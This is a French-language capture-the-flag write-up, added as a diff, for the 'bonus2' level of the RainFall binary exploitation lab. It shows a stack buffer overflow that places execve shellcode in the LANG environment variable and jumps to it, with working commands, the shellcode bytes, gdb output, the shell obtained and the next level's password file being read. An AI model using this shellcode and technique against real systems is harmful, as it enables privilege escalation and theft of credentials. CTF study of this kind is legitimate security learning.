@@ -1,0 +1,64 @@
+Nous avons un binaire qui sans arguments ne revois rien. Cependant en passant deux arg, "Hello " suivis de notre argv[1]
+est print.
+
+Voir disas_analys puis source
+
+En plus du main une fonction greetuser est appeller.
+
+Elle gere les condition de print en fonction de la langue set dans l'env. Si c'est 0 ca print "Hello " si 1
+"Hyv\xc3\xa4\xc3\xa4 p\xc3\xa4iv\xc3\xa4\xc3\xa4" si 2 "Goedemiddag! ".
+
+Dans un premier temps on essaye de trouver le padding pour segfault.
+
+Apres analyse et plusieurs tests on fini par trouver :
+
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print "B" * 40') $(python -c 'print "A" * 26')
+Goedemiddag! BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault (core dumped)
+
+Pour le premier arguments la taille doit etre >= 40 pour que argv[2] soit print car nous depassont les 40 bytes
+Et a partir du 26ieme byte on a le segfault
+
+Il y a pas de call pour /bin/sh comme dans d'autre level. Donc nous devons injecter un shellcode :
+
+"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
+
+Apres analyse on constate que c'est a partir du 32ieme bytes que argv[1] est lu. "Hello " n'en prend pas assez mais en
+utilisant "Goedemiddag! " on atteind avec le shellcode la condition requise pour recrire sur le buffer.
+
+xport LANG=$(python -c 'print("nl" + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80")')
+
+Il nous reste
+plus qu'a trouver l'addresse de l'index de LANG contenu dans l'env pour reussir notre attaque
+
+(gdb) x/18s *((char**)environ)
+0xbffff8e2:	 "TERM=xterm-256color"
+0xbffff8f6:	 "SHELL=/bin/bash"
+0xbffff906:	 "SSH_CLIENT=10.0.2.2 49806 4242"
+0xbffff925:	 "SSH_TTY=/dev/pts/0"
+0xbffff938:	 "USER=bonus2"
+0xbffff944:	 "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31"...
+0xbffffa0c:	 ":*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.d"...
+0xbffffad4:	 "eb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35"...
+0xbffffb9c:	 ":*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mk"...
+0xbffffc64:	 "v=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35"...
+0xbffffd2c:	 ":*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00"...
+0xbffffdf4:	 ";36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:"
+0xbffffe65:	 "COLUMNS=118"
+0xbffffe71:	 "MAIL=/var/mail/bonus2"
+0xbffffe87:	 "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
+0xbffffed4:	 "_=/usr/bin/gdb"
+0xbffffee3:	 "PWD=/home/user/bonus2"
+0xbffffef9:	 "LANG=nl"
+
+0xbffffef9 => \xf9\xfe\xff\xbf
+
+Ensuit on ayant deja fait l'export il nous reste plus qu'a lancer le programme avec le bon padding d'injectio pour argv[1]
+et argv[2]
+
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print "B" * 40') $(python -c 'print "A" * 23 + "\xf9\xfe\xff\xbf"')
+Goedemiddag! BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAA����
+$ whoami
+bonus3
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
